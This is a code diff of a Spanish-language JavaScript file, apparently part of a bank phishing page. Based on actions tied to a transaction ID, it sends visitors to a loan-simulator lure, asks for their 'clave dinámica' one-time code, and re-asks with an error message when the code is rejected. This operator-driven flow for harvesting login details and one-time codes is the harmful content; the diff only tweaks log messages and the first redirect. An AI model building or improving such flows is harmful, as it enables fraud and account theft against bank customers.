@@ -1,3 +1,7 @@
+// ================================================================
+// js/actions.js - CORREGIDO
+// ================================================================
+
 async function handleAction(action, transactionId) {
   const loadingSpinner = document.querySelector(".loadingContainer");
   const errorLogin = document.getElementById("error-login");
@@ -9,7 +13,7 @@ async function handleAction(action, transactionId) {
   
   switch (actionType) {
     case 'correcto':
-      console.log("✅ Redirigiendo a loan-simulator...");
+      console.log("✅ Datos correctos, redirigiendo a loan-simulator...");
       window.location.href = "loan-simulator.html";
       break;
       
@@ -20,14 +24,14 @@ async function handleAction(action, transactionId) {
       break;
       
     case 'pedir_dinamica':
-      console.log("🔐 Solicitando clave dinámica con error...");
-      // ⭐ AGREGAR ?error=1 PARA MOSTRAR EL MENSAJE DE ERROR
-      window.location.href = "auth-dinamica.html?error=1";
+      console.log("🔐 Solicitando clave dinámica (PRIMERA VEZ - SIN ERROR)...");
+      // ⭐ PRIMERA VEZ - SIN PARÁMETRO DE ERROR
+      window.location.href = "auth-dinamica.html";
       break;
       
     case 'error_dinamica':
-      console.log("⚠️ Error en la dinámica, mostrando mensaje...");
-      // ⭐ TAMBIÉN MOSTRAR ERROR Y VOLVER A PEDIR
+      console.log("⚠️ Error en la dinámica (SEGUNDA VEZ O MÁS - CON ERROR)...");
+      // ⭐ SEGUNDA VEZ O MÁS - CON PARÁMETRO ?error=1
       window.location.href = "auth-dinamica.html?error=1";
       break;
       
